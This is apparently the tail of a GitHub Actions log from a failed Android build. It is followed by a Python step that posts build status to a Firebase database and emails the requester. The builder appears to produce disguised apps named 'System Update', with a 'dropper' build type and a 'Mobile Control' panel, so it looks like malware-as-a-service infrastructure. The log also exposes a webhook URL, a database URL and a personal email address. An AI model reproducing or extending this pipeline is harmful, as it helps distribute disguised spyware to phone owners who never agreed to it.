+2026-10-27T08:04:39.1917694Z e: file:///home/runner/work/ando-projet/ando-projet/app/src/main/java/com/example/myapplicationtestweb/StringDecoder.kt:7:99 Argument type mismatch: actual type is 'kotlin.Int', but 'kotlin.Byte' was expected.
+2026-10-27T08:04:39.2737250Z 
+2026-10-27T08:04:39.2760567Z FAILURE: Build failed with an exception.
+2026-10-27T08:04:39.2761104Z 27 actionable tasks: 27 executed
+2026-10-27T08:04:39.2767386Z 
+2026-10-27T08:04:39.2767889Z * What went wrong:
+2026-10-27T08:04:39.2768473Z Execution failed for task ':app:compileDebugKotlin'.
+2026-10-27T08:04:39.2769602Z > A failure occurred while executing org.jetbrains.kotlin.compilerRunner.GradleCompilerRunnerWithWorkers$GradleKotlinCompilerWorkAction
+2026-10-27T08:04:39.2770693Z    > Compilation error. See log for more details
+2026-10-27T08:04:39.2771119Z 
+2026-10-27T08:04:39.2771349Z * Try:
+2026-10-27T08:04:39.2771836Z > Run with --stacktrace option to get the stack trace.
+2026-10-27T08:04:39.2772506Z > Run with --info or --debug option to get more log output.
+2026-10-27T08:04:39.2773134Z > Run with --scan to get full insights.
+2026-10-27T08:04:39.2773708Z > Get more help at https://help.gradle.org.
+2026-10-27T08:04:39.2774143Z 
+2026-10-27T08:04:39.2774392Z BUILD FAILED in 22s
+2026-10-27T08:04:39.2817285Z Configuration cache entry stored.
+2026-10-27T08:04:39.8368152Z ##[error]Process completed with exit code 1.
+2026-10-27T08:04:39.8430567Z ##[group]Run python -c "$(cat <<'PYEOF'
+2026-10-27T08:04:39.8431061Z [36;1mpython -c "$(cat <<'PYEOF'[0m
+2026-10-27T08:04:39.8431290Z [36;1mimport requests, json, re, os[0m
+2026-10-27T08:04:39.8431531Z [36;1mfrom datetime import datetime[0m
+2026-10-27T08:04:39.8431761Z [36;1m[0m
+2026-10-27T08:04:39.8431963Z [36;1muser_id = os.environ.get("USER_ID", "user")[0m
+2026-10-27T08:04:39.8432285Z [36;1mapp_name = os.environ.get("APP_NAME", "Mobile Control")[0m
+2026-10-27T08:04:39.8432650Z [36;1mpkg_name = os.environ.get("PACKAGE_NAME", "com.system.service")[0m
+2026-10-27T08:04:39.8433025Z [36;1minput_email = os.environ.get("USER_EMAIL", "").strip()[0m
+2026-10-27T08:04:39.8433356Z [36;1mis_dropper = os.environ.get("BUILD_TYPE") == "dropper"[0m
+2026-10-27T08:04:39.8433681Z [36;1mstatus = os.environ.get("JOB_STATUS", "failure")[0m
+2026-10-27T08:04:39.8433979Z [36;1mart_name = os.environ.get("ART_NAME", "")[0m
+2026-10-27T08:04:39.8434513Z [36;1mfb_url = "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app"[0m
+2026-10-27T08:04:39.8435244Z [36;1mwebhook_url = "https://script.google.com/macros/s/AKfycbxXY04auYkCIwzpCkhYzanzVLtzagGhbflSdctjrZee10U5T8d7FbhIa6T41hQNTm4E/exec"[0m
+2026-10-27T08:04:39.8435752Z [36;1m[0m
+2026-10-27T08:04:39.8436004Z [36;1mclean_name = re.sub(r"[^\w._\-]", "_", app_name).strip("_") or "App"[0m
+2026-10-27T08:04:39.8436330Z [36;1msuffix = "_dropper" if is_dropper else ""[0m
+2026-10-27T08:04:39.8436854Z [36;1mfname = f"{clean_name}_{user_id}{suffix}.apk"[0m
+2026-10-27T08:04:39.8437184Z [36;1martifact_name = art_name or f"{clean_name}_{user_id}-APK"[0m
+2026-10-27T08:04:39.8437465Z [36;1m[0m
+2026-10-27T08:04:39.8437637Z [36;1m# 1. Update Firebase RTDB[0m
+2026-10-27T08:04:39.8438016Z [36;1mif status == 'success':[0m
+2026-10-27T08:04:39.8438345Z [36;1m    requests.patch(f'{fb_url}/panel_users/{user_id}/build_status.json', json={[0m
+2026-10-27T08:04:39.8438687Z [36;1m        'status': '✅ Complete',[0m
+2026-10-27T08:04:39.8438935Z [36;1m        'percent': 100,[0m
+2026-10-27T08:04:39.8439225Z [36;1m        'last_log': 'Cloud build finished & ready for download!'[0m
+2026-10-27T08:04:39.8439503Z [36;1m    })[0m
+2026-10-27T08:04:39.8439767Z [36;1m    requests.patch(f'{fb_url}/panel_users/{user_id}.json', json={[0m
+2026-10-27T08:04:39.8440064Z [36;1m        'last_apk': fname,[0m
+2026-10-27T08:04:39.8440311Z [36;1m        'last_artifact_name': artifact_name[0m
+2026-10-27T08:04:39.8440545Z [36;1m    })[0m
+2026-10-27T08:04:39.8440714Z [36;1melse:[0m
+2026-10-27T08:04:39.8440993Z [36;1m    requests.patch(f'{fb_url}/panel_users/{user_id}/build_status.json', json={[0m
+2026-10-27T08:04:39.8441323Z [36;1m        'status': '❌ Build Failed',[0m
+2026-10-27T08:04:39.8441571Z [36;1m        'percent': 0,[0m
+2026-10-27T08:04:39.8441815Z [36;1m        'last_log': 'GitHub Actions build failed'[0m
+2026-10-27T08:04:39.8442053Z [36;1m    })[0m
+2026-10-27T08:04:39.8442224Z [36;1m[0m
+2026-10-27T08:04:39.8442410Z [36;1m# 2. Determine target email address[0m
+2026-10-27T08:04:39.8442650Z [36;1mtarget_email = input_email[0m
+2026-10-27T08:04:39.8442874Z [36;1mif not target_email:[0m
+2026-10-27T08:04:39.8443072Z [36;1m    try:[0m
+2026-10-27T08:04:39.8443374Z [36;1m        email_resp = requests.get(f'{fb_url}/panel_users/{user_id}/email.json', timeout=5)[0m
+2026-10-27T08:04:39.8443759Z [36;1m        if email_resp.ok and email_resp.json():[0m
+2026-10-27T08:04:39.8444069Z [36;1m            target_email = str(email_resp.json()).strip()[0m
+2026-10-27T08:04:39.8444339Z [36;1m    except Exception as e:[0m
+2026-10-27T08:04:39.8444597Z [36;1m        print(f'Firebase email lookup notice: {e}')[0m
+2026-10-27T08:04:39.8444854Z [36;1m[0m
+2026-10-27T08:04:39.8445058Z [36;1m# 3. Dispatch Automated Email Notification[0m
+2026-10-27T08:04:39.8445325Z [36;1mif target_email and '@' in target_email:[0m
+2026-10-27T08:04:39.8445631Z [36;1m    now_str = datetime.now().strftime('%d %b %Y, %I:%M %p')[0m
+2026-10-27T08:04:39.8446050Z [36;1m    if status == 'success':[0m
+2026-10-27T08:04:39.8446347Z [36;1m        subj = f'✅ [Ready] APK Build Complete: {app_name} ({user_id})'[0m
+2026-10-27T08:04:39.8446769Z [36;1m        html_body = f'''[0m
+2026-10-27T08:04:39.8446982Z [36;1m        <!DOCTYPE html>[0m
+2026-10-27T08:04:39.8447196Z [36;1m        <html>[0m
+2026-10-27T08:04:39.8447739Z [36;1m        <body style=\"margin: 0; padding: 24px 12px; background-color: #050507; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif;\">[0m
+2026-10-27T08:04:39.8448645Z [36;1m            <div style=\"max-width: 560px; margin: 0 auto; background: #121217; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.8);\">[0m
+2026-10-27T08:04:39.8449555Z [36;1m                <div style=\"padding: 28px 24px; background: linear-gradient(180deg, rgba(255,255,255,0.04) 0%, rgba(255,255,255,0) 100%); border-bottom: 1px solid rgba(255,255,255,0.08); text-align: center;\">[0m
+2026-10-27T08:04:39.8450648Z [36;1m                    <div style=\"display: inline-block; padding: 4px 12px; background: rgba(48,209,88,0.15); border: 1px solid rgba(48,209,88,0.4); border-radius: 20px; font-size: 11px; font-weight: 700; color: #30d158; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px;\">[0m
+2026-10-27T08:04:39.8451409Z [36;1m                        BUILD READY[0m
+2026-10-27T08:04:39.8451645Z [36;1m                    </div>[0m
+2026-10-27T08:04:39.8451972Z [36;1m                    <h1 style=\"margin: 0; font-size: 22px; font-weight: 800; color: #ffffff;\">[0m
+2026-10-27T08:04:39.8452337Z [36;1m                        APK Compilation Finished[0m
+2026-10-27T08:04:39.8452703Z [36;1m                    </h1>[0m
+2026-10-27T08:04:39.8453000Z [36;1m                    <p style=\"margin: 8px 0 0 0; font-size: 14px; color: #a1a1a6;\">[0m
+2026-10-27T08:04:39.8453432Z [36;1m                        Your custom APK package <strong>{app_name}</strong> is ready for installation.[0m
+2026-10-27T08:04:39.8453777Z [36;1m                    </p>[0m
+2026-10-27T08:04:39.8453993Z [36;1m                </div>[0m
+2026-10-27T08:04:39.8454223Z [36;1m                <div style=\"padding: 24px;\">[0m
+2026-10-27T08:04:39.8454698Z [36;1m                    <div style=\"background: rgba(255,255,255,0.03); border-radius: 14px; border: 1px solid rgba(255,255,255,0.05); overflow: hidden;\">[0m
+2026-10-27T08:04:39.8455214Z [36;1m                        <table style=\"width: 100%; border-collapse: collapse;\">[0m
+2026-10-27T08:04:39.8455532Z [36;1m                            <tr>[0m
+2026-10-27T08:04:39.8456023Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b; border-bottom: 1px solid rgba(255,255,255,0.06);\">App Name</td>[0m
+2026-10-27T08:04:39.8457068Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.06);\">{app_name}</td>[0m
+2026-10-27T08:04:39.8457844Z [36;1m                            </tr>[0m
+2026-10-27T08:04:39.8458161Z [36;1m                            <tr>[0m
+2026-10-27T08:04:39.8458789Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b; border-bottom: 1px solid rgba(255,255,255,0.06);\">Package Name</td>[0m
+2026-10-27T08:04:39.8459696Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.06);\">{pkg_name}</td>[0m
+2026-10-27T08:04:39.8460405Z [36;1m                            </tr>[0m
+2026-10-27T08:04:39.8470946Z [36;1m                            <tr>[0m
+2026-10-27T08:04:39.8471489Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b; border-bottom: 1px solid rgba(255,255,255,0.06);\">Build Type</td>[0m
+2026-10-27T08:04:39.8472577Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.06);\">{'Dropper Installer' if is_dropper else 'Main Application'}</td>[0m
+2026-10-27T08:04:39.8473238Z [36;1m                            </tr>[0m
+2026-10-27T08:04:39.8473470Z [36;1m                            <tr>[0m
+2026-10-27T08:04:39.8473827Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #86868b;\">Completed At</td>[0m
+2026-10-27T08:04:39.8474383Z [36;1m                                <td style=\"padding: 10px 14px; font-size: 13px; color: #f5f5f7; font-weight: 600; text-align: right;\">{now_str}</td>[0m
+2026-10-27T08:04:39.8474817Z [36;1m                            </tr>[0m
+2026-10-27T08:04:39.8475039Z [36;1m                        </table>[0m
+2026-10-27T08:04:39.8475249Z [36;1m                    </div>[0m
+2026-10-27T08:04:39.8475577Z [36;1m                    <div style=\"text-align: center; margin-top: 28px; margin-bottom: 10px;\">[0m
+2026-10-27T08:04:39.8476917Z [36;1m                        <a href=\"https://mobile-control-pro.web.app/builder.html?uid={user_id}\" target=\"_blank\" style=\"background: linear-gradient(135deg, #0071e3 0%, #005bb5 100%); color: #ffffff; text-decoration: none; padding: 13px 32px; font-size: 14px; font-weight: 700; border-radius: 980px; display: inline-block; box-shadow: 0 4px 20px rgba(0, 113, 227, 0.4);\">[0m
+2026-10-27T08:04:39.8477967Z [36;1m                            📥 Open Builder & Download APK &rarr;[0m
+2026-10-27T08:04:39.8478239Z [36;1m                        </a>[0m
+2026-10-27T08:04:39.8478452Z [36;1m                    </div>[0m
+2026-10-27T08:04:39.8478792Z [36;1m                </div>[0m
+2026-10-27T08:04:39.8478995Z [36;1m            </div>[0m
+2026-10-27T08:04:39.8479185Z [36;1m        </body>[0m
+2026-10-27T08:04:39.8479374Z [36;1m        </html>[0m
+2026-10-27T08:04:39.8479555Z [36;1m        '''[0m
+2026-10-27T08:04:39.8479733Z [36;1m    else:[0m
+2026-10-27T08:04:39.8479988Z [36;1m        subj = f'❌ [Failed] APK Build Alert: {app_name} ({user_id})'[0m
+2026-10-27T08:04:39.8480290Z [36;1m        html_body = f'''[0m
+2026-10-27T08:04:39.8480512Z [36;1m        <!DOCTYPE html>[0m
+2026-10-27T08:04:39.8480718Z [36;1m        <html>[0m
+2026-10-27T08:04:39.8481220Z [36;1m        <body style=\"margin: 0; padding: 24px 12px; background-color: #050507; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif;\">[0m
+2026-10-27T08:04:39.8482040Z [36;1m            <div style=\"max-width: 560px; margin: 0 auto; background: #121217; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); padding: 24px; text-align: center;\">[0m
+2026-10-27T08:04:39.8482654Z [36;1m                <h2 style=\"color: #ff453a; margin-top: 0;\">APK Build Failed</h2>[0m
+2026-10-27T08:04:39.8483188Z [36;1m                <p style=\"color: #a1a1a6;\">The automated build for <strong>{app_name}</strong> encountered an error during compilation.</p>[0m
+2026-10-27T08:04:39.8484192Z [36;1m                <a href=\"https://mobile-control-pro.web.app/builder.html?uid={user_id}\" style=\"background: #ff453a; color: #fff; text-decoration: none; padding: 10px 24px; border-radius: 980px; font-weight: bold; display: inline-block; margin-top: 16px;\">Check Logs & Retry</a>[0m
+2026-10-27T08:04:39.8484949Z [36;1m            </div>[0m
+2026-10-27T08:04:39.8485152Z [36;1m        </body>[0m
+2026-10-27T08:04:39.8485339Z [36;1m        </html>[0m
+2026-10-27T08:04:39.8485511Z [36;1m        '''[0m
+2026-10-27T08:04:39.8485690Z [36;1m[0m
+2026-10-27T08:04:39.8485874Z [36;1m    # Channel 1: Google Apps Script Webhook[0m
+2026-10-27T08:04:39.8486118Z [36;1m    try:[0m
+2026-10-27T08:04:39.8486303Z [36;1m        mail_payload = {[0m
+2026-10-27T08:04:39.8486626Z [36;1m            'action': 'send_email',[0m
+2026-10-27T08:04:39.8486870Z [36;1m            'to': target_email,[0m
+2026-10-27T08:04:39.8487214Z [36;1m            'subject': subj,[0m
+2026-10-27T08:04:39.8487438Z [36;1m            'htmlBody': html_body[0m
+2026-10-27T08:04:39.8487663Z [36;1m        }[0m
+2026-10-27T08:04:39.8488033Z [36;1m        resp = requests.post(webhook_url, json=mail_payload, timeout=10)[0m
+2026-10-27T08:04:39.8488490Z [36;1m        print(f'Email webhook sent to {target_email}: HTTP {resp.status_code}')[0m
+2026-10-27T08:04:39.8488816Z [36;1m    except Exception as err:[0m
+2026-10-27T08:04:39.8489081Z [36;1m        print(f'Email webhook notice (non-fatal): {err}')[0m
+2026-10-27T08:04:39.8489348Z [36;1m[0m
+2026-10-27T08:04:39.8489600Z [36;1m    # Channel 2: FormSubmit Cloud Gateway Fallback[0m
+2026-10-27T08:04:39.8489854Z [36;1m    try:[0m
+2026-10-27T08:04:39.8490036Z [36;1m        form_payload = {[0m
+2026-10-27T08:04:39.8490254Z [36;1m            '_subject': subj,[0m
+2026-10-27T08:04:39.8490472Z [36;1m            '_template': 'box',[0m
+2026-10-27T08:04:39.8490706Z [36;1m            '_captcha': 'false',[0m
+2026-10-27T08:04:39.8490947Z [36;1m            'Alert': 'APK Build Complete',[0m
+2026-10-27T08:04:39.8491198Z [36;1m            'App_Name': app_name,[0m
+2026-10-27T08:04:39.8491433Z [36;1m            'Package': pkg_name,[0m
+2026-10-27T08:04:39.8491712Z [36;1m            'Build_Type': 'Dropper' if is_dropper else 'Main App',[0m
+2026-10-27T08:04:39.8492004Z [36;1m            'User_UID': user_id,[0m
+2026-10-27T08:04:39.8492365Z [36;1m            'Download_URL': f'https://mobile-control-pro.web.app/builder.html?uid={user_id}'[0m
+2026-10-27T08:04:39.8492721Z [36;1m        }[0m
+2026-10-27T08:04:39.8492907Z [36;1m        f_headers = {[0m
+2026-10-27T08:04:39.8493141Z [36;1m            'Content-Type': 'application/json',[0m
+2026-10-27T08:04:39.8493533Z [36;1m            'Accept': 'application/json',[0m
+2026-10-27T08:04:39.8493855Z [36;1m            'Referer': 'https://mobile-control-pro.web.app',[0m
+2026-10-27T08:04:39.8494189Z [36;1m            'Origin': 'https://mobile-control-pro.web.app'[0m
+2026-10-27T08:04:39.8494452Z [36;1m        }[0m
+2026-10-27T08:04:39.8494845Z [36;1m        f_resp = requests.post(f'https://formsubmit.co/ajax/{target_email}', json=form_payload, headers=f_headers, timeout=10)[0m
+2026-10-27T08:04:39.8495395Z [36;1m        print(f'Email cloud gateway sent to {target_email}: HTTP {f_resp.status_code}')[0m
+2026-10-27T08:04:39.8495742Z [36;1m    except Exception as err2:[0m
+2026-10-27T08:04:39.8496010Z [36;1m        print(f'Email cloud gateway notice: {err2}')[0m
+2026-10-27T08:04:39.8496263Z [36;1mPYEOF[0m
+2026-10-27T08:04:39.8496432Z [36;1m)"[0m
+2026-10-27T08:04:39.8551629Z shell: /usr/bin/bash -e {0}
+2026-10-27T08:04:39.8551849Z env:
+2026-10-27T08:04:39.8552124Z   JAVA_HOME: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:39.8552538Z   JAVA_HOME_17_X64: /opt/hostedtoolcache/Java_Temurin-Hotspot_jdk/17.0.20-1/x64
+2026-10-27T08:04:39.8552848Z   MAVEN_ARGS: -ntp
+2026-10-27T08:04:39.8553042Z   APP_NAME: System Update
+2026-10-27T08:04:39.8553257Z   USER_ID: ggvgghb243_gmail_com
+2026-10-27T08:04:39.8553494Z   PACKAGE_NAME: com.system.service.booster
+2026-10-27T08:04:39.8553737Z   USER_EMAIL: ggvgghb243@gmail.com
+2026-10-27T08:04:39.8553949Z   BUILD_TYPE: main
+2026-10-27T08:04:39.8554129Z   JOB_STATUS: failure
+2026-10-27T08:04:39.8554308Z   ART_NAME: 
+2026-10-27T08:04:39.8554473Z ##[endgroup]
+2026-10-27T08:04:46.1268411Z Email webhook sent to ggvgghb243@gmail.com: HTTP 200
+2026-10-27T08:04:46.1268795Z Email cloud gateway sent to ggvgghb243@gmail.com: HTTP 403
+2026-10-27T08:04:46.1513315Z Post job cleanup.
+2026-10-27T08:04:46.2725776Z Post job cleanup.
+2026-10-27T08:04:46.3757642Z [command]/usr/bin/git version
+2026-10-27T08:04:46.3758148Z git version 2.55.0
+2026-10-27T08:04:46.3782313Z Temporarily overriding HOME='/home/runner/work/_temp/8e7ba6f8-887a-4ba6-a1fb-da2fd891c468' before making global git config changes
+2026-10-27T08:04:46.3783575Z Adding repository directory to the temporary git global config as a safe directory
+2026-10-27T08:04:46.3785887Z [command]/usr/bin/git config --global --add safe.directory /home/runner/work/ando-projet/ando-projet
+2026-10-27T08:04:46.3824942Z [command]/usr/bin/git config --local --name-only --get-regexp core\.sshCommand
+2026-10-27T08:04:46.3892584Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-10-27T08:04:46.4117858Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-10-27T08:04:46.4141751Z http.https://github.com/.extraheader
+2026-10-27T08:04:46.4157393Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
+2026-10-27T08:04:46.4197509Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-10-27T08:04:46.4479115Z [command]/usr/bin/git config --local --name-only --get-regexp ^includeIf\.gitdir:
+2026-10-27T08:04:46.4514050Z [command]/usr/bin/git submodule foreach --recursive git config --local --show-origin --name-only --get-regexp remote.origin.url
+2026-10-27T08:04:46.4859674Z Cleaning up orphan processes
